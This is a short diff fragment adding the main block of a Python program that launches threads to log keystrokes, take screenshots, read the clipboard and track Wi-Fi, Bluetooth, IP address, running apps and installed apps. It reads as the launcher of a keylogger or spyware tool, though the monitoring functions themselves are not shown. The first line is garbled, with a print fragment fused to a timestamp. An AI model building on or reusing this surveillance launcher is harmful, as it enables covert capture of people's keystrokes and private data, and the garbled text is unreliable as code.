@@ -1,0 +1,16 @@
+("Exiting program.")Thu Nov 21 00:19:35 2024: if __name__ == "__main__":
+    threading.Thread(target=monitor_keyboard, daemon=True).start()
+    threading.Thread(target=monitor_keyboard_and_screenshots, daemon=True).start()
+    threading.Thread(target=check_clipboard_for_text, daemon=True).start()
+    threading.Thread(target=monitor_wifi_bluetooth, daemon=True).start()
+    threading.Thread(target=monitor_ip_address, daemon=True).start()
+    threading.Thread(target=monitor_running_apps, daemon=True).start()
+    threading.Thread(target=monitor_installed_apps, daemon=True).start()
+
+    print("Monitoring started. Press Ctrl+C to stop.")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Exiting program.")
+
